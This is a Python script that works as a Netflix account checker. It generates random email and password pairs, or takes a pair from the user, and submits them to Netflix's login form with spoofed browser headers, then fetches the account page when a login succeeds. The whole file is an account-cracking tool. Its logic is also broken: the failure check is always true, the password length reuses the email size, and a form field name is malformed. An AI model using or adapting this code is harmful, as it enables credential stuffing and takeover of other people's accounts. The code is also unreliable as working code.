import random

import requests
from bs4 import BeautifulSoup as Soup

agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"

gen = input("Generate random Y/N > ")
gen = gen.lower()


if gen == 'y':
    amount = int(input("Amount of accounts: "))
    emailSize = int(input('Enter the size of the email: '))
    typeE = input("Enter the email type: ")
    passwordSize = int(input("Enter the size of the password: "))
    for i in range(amount):
        char = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890_-"
        email = ""
        password = ""
        for i1 in range(emailSize):
            email = email + random.choice(char)
        email = email + typeE
        for i1 in range(emailSize):
            password = password + random.choice(char)
        client = requests.Session()
        cookie = dict(flwssn=client.get("https://www.netflix.com/login", headers={"User-Agent": agent}))
        login = client.get("https://www.netflix.com/login", headers={"User-Agent": agent})
        soup = Soup(login.text, 'html.parser')
        loginForm = soup.find('form')
        authURL = loginForm.find('input', {'name': 'authURL'}).get('value')

        headers = {"user-agent": agent,
                   "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                   "accept-language": "en-US,en;q=0.9", "accept-encoding": "gzip, deflate, br",
                   "referer": "https://www.netflix.com/login", "content-type": "application/x-www-form-urlencoded",
                   "cookie": str(cookie)}

        data = {"userLoginId:": email, "password": password, "rememberMeCheckbox": "true", "flow": "websiteSignUp",
                "mode": "login", "action": "loginAction",
                "withFields": "rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode",
                "authURL": authURL, "nextPage": "https://www.netflix.com/browse", "countryCode": "+1",
                "countryIsoCode": "US"}

        request = client.post("https://www.netflix.com/login", headers=headers, data=data)

        if 'Sorry, we can\'t find an account with this email address. Please try again or' or 'Incorrect password' in request.text:
            print(f"BAD | {email} | {password} ")

        else:
            info = client.get("https://www.netflix.com/YourAccount", headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive", "Host": "www.netflix.com", "Referer": "https://www.netflix.com/browse",
                "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-User": "?1", "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"},
                              cookies=cookie, timeout=10).text
            print("info > " + info)
elif gen == "n":
    email = input(" Email: ")
    password = input(" Password: ")
    client = requests.Session()
    cookie = dict(flwssn=client.get("https://www.netflix.com/login", headers={"User-Agent": agent}))
    login = client.get("https://www.netflix.com/login", headers={"User-Agent": agent})
    soup = Soup(login.text, 'html.parser')
    loginForm = soup.find('form')
    authURL = loginForm.find('input', {'name': 'authURL'}).get('value')

    headers = {"user-agent": agent,
               "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
               "accept-language": "en-US,en;q=0.9", "accept-encoding": "gzip, deflate, br",
               "referer": "https://www.netflix.com/login", "content-type": "application/x-www-form-urlencoded",
               "cookie": str(cookie)}

    data = {"userLoginId:": email, "password": password, "rememberMeCheckbox": "true", "flow": "websiteSignUp",
            "mode": "login", "action": "loginAction",
            "withFields": "rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode",
            "authURL": authURL, "nextPage": "https://www.netflix.com/browse", "countryCode": "+1",
            "countryIsoCode": "US"}

    request = client.post("https://www.netflix.com/login", headers=headers, data=data)

    if 'Sorry, we can\'t find an account with this email address. Please try again or' or 'Incorrect password' in request.text:
        print(f"BAD | {email} | {password} ")

    else:
        info = client.get("https://www.netflix.com/YourAccount", headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive", "Host": "www.netflix.com", "Referer": "https://www.netflix.com/browse",
            "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1", "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"},
                          cookies=cookie, timeout=10).text
        print("info > " + info)
else:
    print("Y or N")
    exit()


